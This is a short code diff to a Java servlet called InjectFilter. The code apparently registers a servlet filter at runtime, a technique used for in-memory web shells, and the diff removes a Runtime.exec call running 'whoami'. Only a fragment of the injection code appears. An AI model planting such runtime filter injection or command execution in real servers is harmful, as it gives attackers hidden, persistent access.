@@ -48,7 +48,7 @@ public class InjectFilter extends HttpServlet {
                 injectFilter = new injectFilterDemo();
             }
 
-            java.lang.Runtime.getRuntime().exec("whoami");
+
             FilterDef filterDef = new FilterDef();
             filterDef.setFilter(injectFilter);
             filterDef.setFilterName(name);
